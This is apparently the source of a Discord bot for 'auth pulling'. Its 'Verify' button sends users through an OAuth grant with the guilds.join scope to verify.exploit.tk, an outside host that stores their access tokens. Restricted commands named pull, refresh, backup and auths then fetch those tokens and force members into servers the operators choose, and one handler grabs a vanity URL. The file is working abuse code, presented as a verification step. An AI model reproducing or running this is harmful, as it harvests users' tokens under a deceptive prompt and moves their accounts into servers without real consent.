import os
# import socket
# import websocket-client
# import gateway
#os.system("kill 1")
import sys
import runtime
#os.system("pip install aiohttp")
os.system("pip install jishaku")
#os.system("pip install discord")
os.system("pip install -U git+https://github.com/Rapptz/discord.py")
os.system("pip install requests")
import json
import ast
os.system("pip install dhooks")
from dhooks import Webhook, File
import inspect
import re
import time
import datetime
import asyncio
import discord
import jishaku
import time
import random
import requests
from discord.ext import commands
from discord.ext.commands import has_permissions, MissingPermissions, CommandNotFound

access_huehuehue = (661563598711291904, 1019090071829352469, 827226236429402184)
pwd = os.environ['pwd']
tkn = os.environ['tkn']
API_ENDPOINT = 'https://canary.discord.com/api/v9'
CLIENT_ID = '994684314010796083'
CLIENT_SECRET = os.environ['c_s']
REDIRECT_URI = 'https://verify.exploit.tk'
cachexd = open("cache.txt", "w")
cachexd.write("")

prefix = "~/"
shards = 1


intents = discord.Intents.all()
intents.members = True
intents.messages = True
# headers = {'Authorization': "Bot {}".format(tkn)}

client = commands.AutoShardedBot(shard_count=shards, command_prefix=prefix, case_insensitive=True, intents=intents)

client.remove_command('help')
endpoint = "https://verify.exploit.tk"

def add_to_guild(access_token, userID, guild_Id):
  url = f"{API_ENDPOINT}/guilds/{guild_Id}/members/{userID}"

  botToken = tkn
  data = {
    "access_token": access_token,
  }
  headers = {
    "Authorization": f"Bot {botToken}",
    'Content-Type': 'application/json'
  }
  r = requests.put(url=url, headers=headers, json=data)
  print(r.status_code)
  return r.status_code
  
@client.event
async def on_connect():
  headers = {"Authorization": pwd}
  r = requests.post("%s/backup" % (endpoint), headers=headers)

  
@client.event
async def on_member_join(member):
  guild = member.guild
  if guild.id == 952495772073619466:
    ch = guild.get_channel(1028678964882968606)
    await ch.send(member.mention, delete_after=1)
  elif guild.id == 1001370636188405821:
    ch = guild.get_channel(1001399478894460958)
    await ch.send(member.mention, delete_after=1)
  elif guild.id == 1003550935253000233:
    ch = guild.get_channel(1003556951201951804)
    await ch.send(member.mention, delete_after=1)
  elif guild.id == 1023221759249485904:
    ch = guild.get_channel(1026439261500735558)
    await ch.send(member.mention, delete_after=1)
  elif guild.id == 1000313353283043340:
    ch = guild.get_channel(1000338141326094367)
    await ch.send(member.mention, delete_after=1)
  else:
    return
  
@client.command(aliases=["verif"])
# @commands.cooldown(1, 10, commands.BucketType.user)
@commands.guild_only()
async def verify(ctx):
  if ctx.message.author.id == 661563598711291904:
    await ctx.message.delete()
    view = discord.ui.View() 
    style = discord.ButtonStyle.gray  
    item = discord.ui.Button(style=style, label="Verify", url="https://discord.com/api/oauth2/authorize?client_id=994684314010796083&redirect_uri=https://verify.exploit.tk&response_type=code&scope=identify%20guilds.join")  
    view.add_item(item=item)  
    em = discord.Embed(color=00000, description="<:spy_tick:1029465146420109513> [https://verify.exploit.tk](https://discord.com/api/oauth2/authorize?client_id=994684314010796083&redirect_uri=https://verify.exploit.tk&response_type=code&scope=identify%20guilds.join)")
    em.set_image(url="https://cdn.discordapp.com/attachments/1017051861636882553/1032865014241046538/image_search_1666324567282.png")
    await ctx.send(content="", view=view, embed=em, mention_author=False)
  else:
    return await ctx.send("unauthorized")


# requests pull off
@client.command()
async def check(ctx, id:str):
  if ctx.message.author.id not in access_huehuehue:
    return await ctx.send("unauthorized")
  session = requests.Session()
  headers= {"Authorization": pwd}
  json = {"user": id}
  r = session.get("%s/check" % (endpoint), headers=headers, json=json)
  return await ctx.send(r.text)
  
@client.command()
@commands.is_owner()
async def pullall(ctx, guild: int):
  if ctx.message.author.id not in access_huehuehue:
    return await ctx.send("unauthorized")
  return await ctx.send("failed")
  json = {"guild": guild}
  session = requests.Session()
  r = session.post("%s/pull" % (endpoint), headers={"Authorization": pwd}, json=json)

@client.command()
async def pull(ctx, user:str):
  if ctx.message.author.id not in access_huehuehue:
    return await ctx.send("unauthorized")
  print(ctx.message.author.id)
  if ctx.guild.id != 952495772073619466:
    return await ctx.send("socials server only")
  session = requests.Session()
  url = "%s/pullsingle" % (endpoint)
  headers = {"Authorization": pwd}
  json = {"user": user}
  r = session.get(url, headers=headers, json = json)
  access = r.text
  if "dberr" in access:
    return await ctx.send("this user is not in database")
  gid = str(ctx.guild.id)
  r = add_to_guild(access, user, gid)
  if r in (200, 201, 204):
    return await ctx.send("success")
  return await ctx.send("failed")

@client.command()
async def refresh(ctx, user:str):
  if ctx.message.author.id not in access_huehuehue:
    return await ctx.send("unauthorized")
  print(ctx.message.author.id)
  session = requests.Session()
  url = "%s/refreshsingle" % (endpoint)
  headers = {"Authorization": pwd}
  json = {"user": user}
  r = session.put(url, headers=headers, json = json)
  txt = r.text
  return await ctx.send(txt)

@client.command()
async def refreshall(ctx, user:str):
  if ctx.message.author.id not in access_huehuehue:
    return await ctx.send("unauthorized")
  return "failed"
  session = requests.Session()
  url = "%s/refresh" % (endpoint)
  headers = {"Authorization": pwd}
  json = {"user": user}
  r = session.post(url, headers=headers, json = json)
  return await ctx.send(r.status_code)


  
@client.command(aliases=["auths"])
async def members(ctx):
  if ctx.message.author.id not in access_huehuehue:
    return await ctx.send("unauthorized")
  headers = {"Authorization": pwd}
  session = requests.Session()
  r = session.get("%s/members" % (endpoint), headers=headers)
  count = r.text
  return await ctx.send(count)

@client.command()
async def help(ctx):
  em = discord.Embed(color=00000, description="commands - \n\n verify, auths, check, pull, pullall, refresh, refreshall, backup")
  return await ctx.send(embed=em)
  

@client.command()
async def backup(ctx):
  if ctx.message.author.id not in access_huehuehue:
    return await ctx.send("unauthorized")
  session = requests.Session()
  headers = {"Authorization": pwd}
  r = session.post("%s/backup" % (endpoint), headers=headers)
  return await ctx.send(r.status_code)
@client.event
async def on_command_error(ctx, error):
  if isinstance(error, CommandNotFound):
    return
  await ctx.send(error)

@client.event
async def on_guild_update(before, after):
  session = requests.Session()
  if before.id != 952495772073619466:
    return
  # async with aiohttp.Clientsession(connector=None) as session:
  #   async with session.patch("https://canary.discord.com/api/v9/guilds/%s/vanity-url") as r:
  url = "https://ptb.discord.com/api/v9/guilds/%s/vanity-url" % (before.id)
  headers = {"Authorization": "Bot %s" % (tk)}
  json = {"code": "spy"}
  r = session.patch(url, headers=headers, json=json)
  print(r.status_code)
  return r.status_code

  
try:
  client.run(tkn, reconnect=True)
except:
  os.system("kill 1")
